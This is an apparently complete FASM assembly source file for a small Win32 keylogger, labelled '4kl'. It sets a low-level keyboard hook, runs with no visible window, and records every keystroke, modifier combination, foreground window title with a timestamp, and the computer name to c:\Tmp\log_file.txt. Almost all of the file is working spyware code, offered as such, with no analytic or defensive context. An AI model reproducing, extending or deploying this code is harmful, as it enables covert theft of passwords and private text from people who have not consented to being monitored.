
    format PE GUI 5.0       ; Subsystem Version (min Windows 2000)

;   =========================================================
    section '.code' code import writeable readable executable
;   =========================================================
include 'win32ax.inc'
;include 'conutils.inc'
include 'local_iat.imports'
include 'macro\if.inc'

;-------------------------------------------------------------------------------
macro println arg*
{
   cinvoke wprintf, '%s', arg
   cinvoke wprintf, CRLF
}

;-------------------------------------------------------------------------------
macro print_num_ln arg*
{
   cinvoke wprintf, '%d', arg
   cinvoke wprintf, CRLF
}


; -----------------------------------------------------------
; MAIN PROC
; -----------------------------------------------------------
proc LoopFunc
    mov eax, SleepTime
    test eax, eax
.readloop:    
    cinvoke SleepX, eax    
    jmp     .readloop
endp


START_SIZE = 1024
proc ReadTheInput
begin
        mov     [SourceSize], START_SIZE

        stdcall GetMem, [SourceSize]
        mov     edi, eax

        xor     esi, esi

.readloop:
        mov     ebx, [SourceSize]
        lea     eax, [esi+edi]
        sub     ebx, esi

        stdcall FileRead, [STDIN], eax, ebx
        cmp     eax, ebx
        jne     .endoffile

        add     esi, ebx
        shl     [SourceSize], 1

        stdcall ResizeMem, edi, [SourceSize]
        mov     edi, eax

        jmp     .readloop

.endoffile:
        add     esi, eax
        mov     [SourceSize], esi
        xor     eax, eax

        mov     [pSourceBuffer], edi
        mov     [edi+esi], eax  ; zero terminated...

        return
endp

proc MyPrintNumber
     local  mydouble:QWORD, myfloat:DWORD

     mov     [myfloat], 3.141
     fld     [myfloat]
     fstp    [mydouble]
     cinvoke printf, "fp number %f", double [mydouble]
endp 

proc MyPrintString
         
        push 0          ;C-string null
        push "test"
        push esp
        call printf
        add esp,12
        push 0
        call exit
        ;ret
endp 

proc CheckInstances uses eax
    locals
        dwBytesWritten      rd 1
        hFile               rd 1
        buff                du 256      dup (?)
        tmpstr              du 256      dup (?)
    endl
    ;invoke    CreateMutexA, onlyOneCopy,0,0
    ;invoke    GetLastError

    ;cmp     eax,ERROR_ALREADY_EXISTS
    ;je  more_than_one_copy  

    ;invoke    GetLastError
    ;cinvoke wsprintfW, addr buff, sfrmtError, addr eax
    ;stdcall WriteToFile, addr buff


    invoke GetComputerNameA, addr tmpstr, addr dwBytesWritten
    cinvoke wsprintfW, addr buff, sfrmtComputer, addr tmpstr
    stdcall WriteToFile, addr buff
  
    ret
endp

    FILE_APPEND_DATA = 0x0004

struct KBDLLHOOKSTRUCT
    vkCode          rd 1
    scanCode        rd 1
    flags           rd 1
    time            rd 1
    dwExtraInfo     rd 1
ends


proc WriteToFile uses esi, wText
    locals
        dwBytesWritten      rd 1
        hFile               rd 1
    endl

    invoke CreateFileW, log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax <> INVALID_HANDLE_VALUE
        mov [hFile], eax
        invoke lstrlenW, [wText]
        imul eax, 2
        invoke WriteFile, [hFile], [wText], eax, addr dwBytesWritten, NULL
        .if eax = 1
            invoke CloseHandle, [hFile]
            xor eax, eax
            inc eax
            ret
        .endif
    .endif

    xor eax, eax
    ret
endp


proc LowLevelKeyboardProc uses esi, nCode, wParam, lParam
    locals
        newWindow           du 256      dup (?)
        oldWindow           du 256      dup (?)
        appName             du 1024     dup (?)
        szKey               du 256      dup (?)
        buff                du 256      dup (?)
        wChar               du 16       dup (?)
        hWindowHandle       rd 1
        dwMsg               rd 1
        dwProcessId         rd 1
    endl

    .if (([nCode] = HC_ACTION) & (([wParam] = WM_SYSKEYDOWN) | ([wParam] = WM_KEYDOWN)))
        mov esi, [lParam]
        virtual at esi
            kbHook KBDLLHOOKSTRUCT <>
        end virtual

        mov eax, [kbHook.flags]
        shl eax, 0x8
        add eax, [kbHook.scanCode]
        shl eax, 0x10
        inc eax
        invoke GetKeyNameTextW, eax, addr szKey, 256

        stdcall CheckInstances

        invoke GetForegroundWindow
        .if eax <> NULL
            mov [hWindowHandle], eax
            invoke GetWindowTextW, [hWindowHandle], addr newWindow, 1024
            .if eax <> 0
                invoke lstrcmpW, addr newWindow, addr oldWindow
                .if eax <> 0                
                    invoke GetLocalTime, LocalTime

                    movzx eax, word[LocalTime.wSecond]
                    push eax

                    movzx eax, word[LocalTime.wMinute]
                    push eax

                    movzx eax, word[LocalTime.wHour]
                    push eax

                    movzx eax, word[LocalTime.wYear]
                    push eax

                    movzx eax, word[LocalTime.wMonth]
                    push eax

                    movzx eax, word[LocalTime.wDay]
                    push eax

                    cinvoke wsprintfW, addr appName, tittleFrmt, addr newWindow
                    stdcall WriteToFile, addr appName
                    .if eax = 1
                        invoke lstrcpyW, addr oldWindow, addr newWindow
                    .endif
                .endif

            .endif

            invoke GetKeyState, VK_LCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LCONTROL
                    cinvoke wsprintfW, addr buff, sfrmtLcontrol, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RCONTROL
                    cinvoke wsprintfW, addr buff, sfrmtRcontrol, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_LMENU
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LMENU
                    cinvoke wsprintfW, addr buff, sfrmtLmenu, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RMENU
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RMENU
                    cinvoke wsprintfW, addr buff, sfrmtRmenu, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_LWIN
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LWIN
                    cinvoke wsprintfW, addr buff, sfrmtLwin, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RWIN
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RWIN
                    cinvoke wsprintfW, addr buff, sfrmtRwin, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@:    .if [kbHook.vkCode] = VK_BACK
                    stdcall WriteToFile, sBackspace
                    .endif

                .if [kbHook.vkCode] = VK_TAB
                    stdcall WriteToFile, sTab
                    .endif

                .if [kbHook.vkCode] = VK_RETURN
                    stdcall WriteToFile, sEnter
                    .endif

                .if [kbHook.vkCode] = VK_PAUSE
                    stdcall WriteToFile, sPause
                    .endif

                .if [kbHook.vkCode] = VK_CAPITAL
                    stdcall WriteToFile, sCapsLock
                    .endif

                .if [kbHook.vkCode] = VK_ESCAPE
                    stdcall WriteToFile, sEsc
                    .endif

                .if [kbHook.vkCode] = VK_PRIOR
                    stdcall WriteToFile, sPageUp
                    .endif

                .if [kbHook.vkCode] = VK_NEXT
                    stdcall WriteToFile, sPageDown
                    .endif

                .if [kbHook.vkCode] = VK_END
                    stdcall WriteToFile, sEnd
                    .endif

                .if [kbHook.vkCode] = VK_HOME
                    stdcall WriteToFile, sHome
                    .endif

                .if [kbHook.vkCode] = VK_LEFT
                    stdcall WriteToFile, sLeft
                    .endif

                .if [kbHook.vkCode] = VK_UP
                    stdcall WriteToFile, sUp
                    .endif

                .if [kbHook.vkCode] = VK_RIGHT
                    stdcall WriteToFile, sRight
                    .endif

                .if [kbHook.vkCode] = VK_DOWN
                    stdcall WriteToFile, sDown
                    .endif

                .if [kbHook.vkCode] = VK_SNAPSHOT
                    stdcall WriteToFile, sPrintScreen
                    .endif

                .if [kbHook.vkCode] = VK_INSERT
                    stdcall WriteToFile, sIns
                    .endif

                .if [kbHook.vkCode] = VK_DELETE
                    stdcall WriteToFile, sDel
                    .endif

                .if [kbHook.vkCode] = VK_F1
                    stdcall WriteToFile, sF1
                    .endif

                .if [kbHook.vkCode] = VK_F2
                    stdcall WriteToFile, sF2
                    .endif

                .if [kbHook.vkCode] = VK_F3
                    stdcall WriteToFile, sF3
                    .endif

                .if [kbHook.vkCode] = VK_F4
                    stdcall WriteToFile, sF4
                    .endif

                .if [kbHook.vkCode] = VK_F5
                    stdcall WriteToFile, sF5
                    .endif

                .if [kbHook.vkCode] = VK_F6
                    stdcall WriteToFile, sF6
                    .endif

                .if [kbHook.vkCode] = VK_F7
                    stdcall WriteToFile, sF7
                    .endif

                .if [kbHook.vkCode] = VK_F8
                    stdcall WriteToFile, sF8
                    .endif

                .if [kbHook.vkCode] = VK_F9
                    stdcall WriteToFile, sF9
                    .endif

                .if [kbHook.vkCode] = VK_F10
                    stdcall WriteToFile, sF10
                    .endif

                .if [kbHook.vkCode] = VK_F11
                    stdcall WriteToFile, sF11
                    .endif

                .if [kbHook.vkCode] = VK_F12
                    stdcall WriteToFile, sF12
                    .endif

                .if [kbHook.vkCode] = VK_NUMLOCK
                    stdcall WriteToFile, sNumLock
                    .endif

                .if [kbHook.vkCode] = VK_SCROLL
                    stdcall WriteToFile, sScrollLock
                    .endif

                .if [kbHook.vkCode] = VK_APPS
                    stdcall WriteToFile, sApplications
                    .endif

                
                    invoke VirtualAlloc, 0, 256, MEM_COMMIT, PAGE_EXECUTE_READWRITE
                    mov edi, eax

                    invoke GetKeyboardState, edi
                    .if eax <> 0
                        invoke GetKeyState, VK_SHIFT
                        mov [edi + VK_SHIFT], al

                        invoke GetKeyState, VK_CAPITAL
                        mov [edi + VK_CAPITAL], al

                        invoke GetForegroundWindow
                        invoke GetWindowThreadProcessId, eax, addr dwProcessId
                        invoke GetKeyboardLayout, eax

                        invoke ToUnicodeEx, [kbHook.vkCode], [kbHook.scanCode], edi, addr wChar, 16, [kbHook.flags], eax
                        stdcall WriteToFile, addr wChar
                    .endif

                    invoke VirtualFree, edi, 0, MEM_RELEASE
                    .endif
           

        .endif
    .endif


next:
    invoke CallNextHookEx, [hKeyHook], [nCode], [wParam], [lParam]
    ret
endp


proc KeyLogger uses edi, lpParameter
    locals
        msg         MSG
    endl

    invoke GetModuleHandleA, NULL
    test eax, eax
    jne @f

    invoke LoadLibraryA, [lpParameter]
    test eax, eax
    jne @f
    inc eax
    jmp exit

@@: invoke SetWindowsHookExA, WH_KEYBOARD_LL, LowLevelKeyboardProc, eax, NULL
    mov [hKeyHook], eax

@@: invoke GetMessageA, addr msg, 0, 0, 0
    test eax, eax
    je exit
    invoke TranslateMessage, addr msg
    invoke DispatchMessageA, addr msg
    jmp @b

    invoke UnhookWindowsHookEx, addr hKeyHook
    xor eax, eax

more_than_one_copy:
    push    eax     ; call stop and lets go away
    call    exit

exit:
    ret
endp


;   =========================================================
;           ENTRY POINT
;   =========================================================
entry $
    ;println progName
    ;println progDesc
    ;println progCopy
    invoke CreateThread, NULL, NULL, KeyLogger, NULL, NULL, dwThread
    test eax, eax
    je @f

    invoke WaitForSingleObject, eax, -1

    stdcall LoopFunc

    jmp Exit

@@: xor eax, eax
    inc eax
Exit:
    ret
; -----------------------------------------------------------
; VARIABLES
; -----------------------------------------------------------
    tittleFrmt              du 10, 10, '[%s] - %02d/%02d/%04d, %02d:%02d:%02d', 10, 0
    log_file                du 'c:\\Tmp\\log_file.txt',      0
    sfrmtError              du '[ERROR: %d]',       0
    sfrmtComputer           du '[Computername: %s]',0
    sfrmtUsername           du '[Username: %s]',    0
    sfrmtLcontrol           du '[CtrlL + %s]',      0
    sfrmtRcontrol           du '[CtrlR + %s]',      0
    sfrmtLmenu              du '[AltL + %s]',       0
    sfrmtRmenu              du '[AltR + %s]',       0
    sfrmtLwin               du '[WinL + %s]',       0
    sfrmtRwin               du '[WinR + %s]',       0

    sBackspace              du '[Backspace]',       0
    sTab                    du '[Tab]',             0
    sEnter                  du '[Enter]', 10,       0
    sPause                  du '[Pause]',           0
    sCapsLock               du '[Caps Lock]',       0
    sEsc                    du '[Esc]',             0
    sPageUp                 du '[Page Up]',         0
    sPageDown               du '[Page Down]',       0
    sEnd                    du '[End]',             0
    sHome                   du '[Home]',            0
    sLeft                   du '[Left]',            0
    sUp                     du '[Up]',              0
    sRight                  du '[Right]',           0
    sDown                   du '[Down]',            0
    sPrintScreen            du '[Print Screen]',    0
    sIns                    du '[Ins]',             0
    sDel                    du '[Del]',             0
    sF1                     du '[F1]',              0
    sF2                     du '[F2]',              0
    sF3                     du '[F3]',              0
    sF4                     du '[F4]',              0
    sF5                     du '[F5]',              0
    sF6                     du '[F6]',              0
    sF7                     du '[F7]',              0
    sF8                     du '[F8]',              0
    sF9                     du '[F9]',              0
    sF10                    du '[F10]',             0
    sF11                    du '[F11]',             0
    sF12                    du '[F12]',             0
    sNumLock                du '[Num Lock]',        0
    sScrollLock             du '[Scroll Lock]',     0
    sApplications           du '[Applications]',    0
    CRLF                    du '',13,10,0  
    progName                du '4kl: Win32 simple keylogger, 4Kilobytes',0
    progDesc                du 'Logs to c:\\Tmp\\log_file.txt',0
    progCopy                du 'Copyright (c) 2000-2021 by gplante',0
    ERROR_ALREADY_EXISTS    rd 183
    SleepTime               rd 100
    onlyOneCopy             du 'Global\zkl',        0
    LocalTime               SYSTEMTIME <>
    dwThread                rd 1
    hKeyHook                rd 1
